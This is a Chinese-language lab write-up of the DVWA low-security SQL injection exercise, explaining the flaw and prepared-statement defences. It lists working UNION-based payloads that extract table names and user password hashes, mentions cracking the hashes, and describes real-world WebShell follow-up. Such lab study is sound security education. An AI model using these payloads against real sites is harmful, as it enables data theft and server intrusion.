DVWA-Low-SQL注入 (SQL Injection)

2026年10月2日 DVWA Web安全 SQL注入 UNION查询

一、题目信息

  • 题目名称：DVWA SQL Injection (Low)
  • 题目平台：DVWA (本地 Docker / 灵境靶场)
  • 题目类型：Web安全 / SQL注入 / GET型字符型注入
  • 靶场链接：http://192.168.242.80/vulnerabilities/sqli/
  • 涉及工具：Google Chrome 浏览器、Burp Suite

二、解题步骤

1. 分析题目考什么

本题的核心考点是SQL注入（SQL Injection）。后端代码直接将用户输入的 User ID 拼接到 SQL 查询语句中，没有进行任何过滤。攻击者可以利用单引号闭合原语句，并使用 UNION 联合查询获取数据库中的任意数据。

2. 怎么想（破题思路）

  • 输入 1，正常回显 admin，确认业务功能。
  • 输入 1'，页面报错，确认存在 SQL 注入，且闭合方式为单引号。
  • 使用 ORDER BY 判断字段数，确定当前查询返回 2 个字段。
  • 利用 UNION SELECT 将恶意查询结果回显到页面上，逐步提取数据库名、表名、列名，最终获取用户密码哈希。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录：URL 编码与特殊符号处理

踩坑情况：在构造复杂的 UNION 查询时，输入到浏览器地址栏或输入框中的内容如果包含空格、单引号，可能会导致解析错误。

原因分析：浏览器地址栏会自动对特殊字符进行 URL 编码（如空格变成 + 或 %20），导致 Payload 在传输过程中变形。

改进方式：尽量在 Burp Suite 的 Repeater 模块中构造和发送注入请求，或者在地址栏手动将空格替换为 + 或 %20，确保 Payload 原样传输。

详细实操步骤（Payload逐字解释）

第一步：判断闭合方式

输入：1'

响应结果：页面报错 You have an error in your SQL syntax...，说明原 SQL 语句是单引号闭合的字符型注入。

第二步：判断字段数

输入：1' ORDER BY 1-- - （正常）

输入：1' ORDER BY 2-- - （正常）

输入：1' ORDER BY 3-- - （报错）

结论：当前查询返回 2 个字段。这里的 -- - 是 SQL 注释符，用于注释掉原语句后面的单引号和逻辑。

第三步：UNION 联合查询爆数据

查看回显位置：1' UNION SELECT 1,2-- -

获取数据库名与版本：1' UNION SELECT database(), version()-- -

获取所有表名：1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -

获取 users 表的字段名：1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -

获取用户名和密码哈希：1' UNION SELECT user, password FROM users-- -

响应结果：页面回显了所有用户的账号和 MD5 密码哈希值。将其放入 cmd5.com 等解密网站，即可获取明文密码。

4. 怎么迁移（跨领域联想）

  • 真实场景：很多老旧的企业官网或 OA 系统，其新闻详情页的 ?id=xxx 参数就是典型的 SQL 注入点。攻击者通过注入获取管理员密码，登录后台后上传 WebShell，最终控制整个服务器。
  • 防御策略：无论什么语言，必须使用预编译（Prepared Statements）。将 SQL 语句的“代码”与“数据”彻底分离，让数据库引擎无法把用户输入当作指令执行。

三、名词大全与原理深度复盘

1. SQL注入 (SQL Injection)

攻击者将恶意的 SQL 代码插入到应用的输入参数中，欺骗后端数据库执行非预期的查询，从而窃取数据、篡改数据甚至获取系统权限。

2. UNION 联合查询

SQL 中的一种操作符，用于合并两个或多个 SELECT 语句的结果集。在注入中，攻击者利用它将恶意查询的结果拼接到正常查询结果后，从而在页面上直接回显数据。

3. information_schema

MySQL 的系统数据库，存储了所有数据库、表、列的名称。它是 SQL 注入中获取元数据的“藏宝图”。

4. group_concat()

MySQL 的聚合函数，用于将查询结果的多行合并为一个字符串。在受限次数的注入中非常关键，它能让我们一次性获取所有表名或列名。

5. 预编译 (Prepared Statements)

防御 SQL 注入的最有效手段。它先将 SQL 语句模板发送给数据库编译，然后再将用户输入作为纯数据传入。数据库不会再把用户输入当作 SQL 代码解析，从根本上杜绝了注入。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 SQL 盲注的区别：本题是普通的 UNION 注入，有回显位，可以一次性爆出大量数据。而盲注（如 SQL Injection Blind）没有回显，只能通过页面状态或时间延迟逐字符推断，效率极低。
  • 与命令注入的区别：SQL 注入攻击的是数据库层，而命令注入攻击的是操作系统层。在权限上，命令注入通常危害更大。

2. 这种题目的出现原因（为什么存在）

漏洞存在的根本原因在于代码直接拼接 SQL 语句。例如：$query = "SELECT * FROM users WHERE id = '$id';";。开发者把用户输入当作了 SQL 代码的一部分。

从历史角度看，这在 2000 年代初的 Web 开发中非常普遍。当时很多开发者为了快速实现功能，忽略了安全设计，导致了大量网站被 SQL 注入攻破，著名的 2011 年索尼 PSN 被黑事件就是典型案例。

3. 这种的应用

在护网中，SQL 注入是“外网打点”的最高频漏洞之一。攻击者通过 SQL 注入获取数据库中的管理员账号密码，登录后台后寻找文件上传点，最终拿到 WebShell，进入内网。

4. 如何抽象理解概念（大白话）

把 SQL 注入比作“点餐”：

  • 正常情况：你告诉服务员：“我要一份牛肉面。”（输入 1）
  • 恶意情况：你告诉服务员：“我要一份牛肉面，并且把后厨的所有菜谱都给我。”（输入 1' UNION SELECT ...）
  • 如果服务员不加思考（没做过滤），他真的会把菜谱也拿给你。这就是 SQL 注入。

做一道题，就要往自己脑子里装点东西。
